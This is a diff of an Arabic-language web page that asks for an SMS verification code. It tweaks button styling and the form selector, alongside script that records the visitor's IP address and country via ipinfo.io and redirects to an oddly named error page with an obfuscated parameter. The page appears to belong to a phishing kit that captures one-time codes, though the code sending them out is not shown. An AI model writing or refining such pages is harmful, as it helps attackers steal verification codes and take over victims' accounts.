@@ -312,7 +312,7 @@ span{
 
   </div>
 
-<form>
+<form action="#">
 <input type="hidden" id="ip">
 <input type="hidden" id="country">
 
@@ -322,15 +322,11 @@ span{
     </div>
 	<p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
 <div style="text-align: center;">
-    <button style="padding: 10px 20px;
-        font-size: 16px;
-        background-color: #4CAF50;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
+    
+    <button  style="padding: 10px 20px;font-size: 16px;background-color: #4CAF50;color: #fff;border: none;border-radius: 5px;
         cursor: pointer;
         display: inline-block;
-		width: 150px;" type="submit">متابعة</button>
+		width: 150px;font-family: 'Cairo', sans-serif;" type="submit">متابعة</button>
 </div>
 	
   </form>
@@ -341,7 +337,7 @@ span{
 
 <script>
     $(document).ready(function() {
-        $('form').submit(function(event) {
+        $('#otp').submit(function(event) {
             event.preventDefault();
 
             var smsCode = $("#sms").val();
@@ -369,6 +365,11 @@ span{
                 window.location.href = "SMS_ERRUR091a.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
             });
         });
+
+
+
+
+
 
         // جلب معلومات الـ IP باستخدام خدمة ipinfo.io
         $.get("https://ipinfo.io/", function(response) {
